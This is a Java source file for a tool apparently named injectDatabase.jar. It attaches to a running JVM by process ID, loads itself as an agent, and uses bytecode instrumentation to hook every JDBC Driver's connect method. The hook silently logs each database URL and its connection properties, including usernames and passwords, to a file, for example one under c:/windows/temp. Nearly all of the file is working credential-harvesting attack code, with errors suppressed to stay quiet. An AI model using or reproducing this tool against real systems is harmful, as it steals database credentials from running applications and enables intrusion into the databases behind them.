package com.abc;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import javassist.*;

import java.io.File;
import java.io.FileOutputStream;
import java.io.UnsupportedEncodingException;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.lang.reflect.Method;
import java.net.URLDecoder;
import java.sql.Driver;
import java.util.HashMap;
import java.util.List;
import java.util.Properties;

public class Main {
    private static HashMap dbConnMap=new HashMap();
    private static String outFile;
    public static void main(String[] args) throws Throwable{
        if (args.length == 0){
            help();
            return;
        }
        Class.forName("sun.tools.attach.HotSpotAttachProvider");
        String option = args[0].trim();
        if ("list".equals(option)){
            List<VirtualMachineDescriptor> vms = VirtualMachine.list();
            System.out.println("vm count: " + vms.size());
            for (int i = 0; i < vms.size(); i++) {
                VirtualMachineDescriptor vm = vms.get(i);
                System.out.println(String.format("pid: %s displayName:%s",vm.id(),vm.displayName()));
            }
        }else if ("inject".equals(option) && args.length >= 2){
            String targetPid = args[1];
            String outFile = args[2];
            VirtualMachine virtualMachine = VirtualMachine.attach(targetPid);
            virtualMachine.loadAgent(getJarFileByClass(Main.class),outFile);
            System.out.println("inject ok!");
        }else {
            help();
        }
    }
    public static void help(){
        System.out.println("java -jar injectDatabase.jar list\n" +
                "java -jar injectDatabase.jar inject targetPid outFile\n" +
                "\t\tjava -jar injectDatabase.jar inject 19716 c:/windows/temp/databaseconn.txt");
    }
    public static String getJarFileByClass(Class cs) {
        String fileString=null;
        String tmpString;
        if (cs!=null) {
            tmpString=cs.getProtectionDomain().getCodeSource().getLocation().getFile();
            if (tmpString.endsWith(".jar")) {
                try {
                    fileString= URLDecoder.decode(tmpString,"utf-8");
                } catch (UnsupportedEncodingException e) {
                    fileString=URLDecoder.decode(tmpString);
                }
            }
        }

        return new File(fileString).toString();
    }
    public static String getMethodSignature(Method method) {
        StringBuilder s = new StringBuilder();
        Class[] types = new Class[method.getParameterTypes().length + 1];
        String[] typeStrArr = new String[types.length];
        System.arraycopy(method.getParameterTypes(),0,types,0,types.length-1);
        types[types.length-1] = method.getReturnType();



        for (int i = 0; i < types.length; i++) {
            Class type = types[i];
            boolean isArray = type.isArray();
            if (isArray) {
                type = type.getComponentType();
            }

            if (int.class.equals(type)) {
                typeStrArr[i] = "I";
            }else if (void.class.equals(type)) {
                typeStrArr[i] = "V";
            }else if (boolean.class.equals(type)) {
                typeStrArr[i] = "Z";
            }else if (char.class.equals(type)) {
                typeStrArr[i] = "C";
            }else if (byte.class.equals(type)) {
                typeStrArr[i] = "B";
            }else if (short.class.equals(type)) {
                typeStrArr[i] = "S";
            }else if (float.class.equals(type)) {
                typeStrArr[i] = "F";
            }else if (long.class.equals(type)) {
                typeStrArr[i] = "J";
            }else if (double.class.equals(type)) {
                typeStrArr[i] = "D";
            }else {
                typeStrArr[i] ="L" + type.getName().replace(".","/")+";";
            }

            if (isArray){
                typeStrArr[i] = "[" + typeStrArr[i];
            }

        }

        s.append("(");

        for (int i = 0; (i < typeStrArr.length-1); i++) {
            s.append(typeStrArr[i]);
        }

        s.append(")");

        s.append(typeStrArr[typeStrArr.length -1]);

        return s.toString();
    }

    public static void agentmain(String agentArg, Instrumentation inst){
        outFile = agentArg;
        Class[] classes  = inst.getAllLoadedClasses();
        for (int i = 0; i < classes.length; i++) {
            Class clazz = classes[i];
            try {
                if (Driver.class.isAssignableFrom(clazz)){
                    ClassPool classPool = new ClassPool(true);
                    classPool.insertClassPath(new ClassClassPath(clazz));
                    classPool.insertClassPath(new LoaderClassPath(clazz.getClassLoader()));
                    CtClass ctClass = classPool.get(clazz.getName());
                    CtMethod ctMethod = ctClass.getMethod("connect","(Ljava/lang/String;Ljava/util/Properties;)Ljava/sql/Connection;");
                    ctMethod.insertBefore(String.format("                    try {\n" +
                            "                        java.lang.Class.forName(\"%s\",true,java.lang.ClassLoader.getSystemClassLoader()).getMethod(\"add\", new java.lang.Class[]{java.lang.String.class, java.util.Properties.class}).invoke(null,new java.lang.Object[]{$1,$2});\n" +
                            "                    }catch (java.lang.Throwable e){\n" +
                            "                        \n" +
                            "                    }",Main.class.getName()));
                    inst.redefineClasses(new ClassDefinition(clazz,ctClass.toBytecode()));
                    ctClass.detach();
                }
            }catch (Throwable e){
//                e.printStackTrace();
            }
        }
    }
    private static boolean eq(String url,String properties) throws Throwable{
        if (dbConnMap.containsKey(url)) {
            String valueProperties=(String) dbConnMap.get(url);
            if (valueProperties.indexOf(properties)!=-1) {
                return true;
            }else {
                if (valueProperties.length()>2000) {
                    valueProperties="";
                }
                dbConnMap.put(url, valueProperties+"\t"+properties);
                return true;
            }
        }
        return false;
    }

    public static void add(String url, Properties info) {
        try {
            String propertiesString=info.toString();
            if (dbConnMap.size()>200) {
                dbConnMap.clear();
            }
            if (!eq(url, propertiesString)) {
                FileOutputStream fileOutputStream = new FileOutputStream(new File(outFile),true);
                fileOutputStream.write(String.format("JdbcUrl:%s\tproperties:%s\r\n",url,info).getBytes());
                fileOutputStream.flush();
                fileOutputStream.close();
                dbConnMap.put(url, propertiesString);
            }
        } catch (Throwable e) {
//            e.printStackTrace();
        }
    }
}
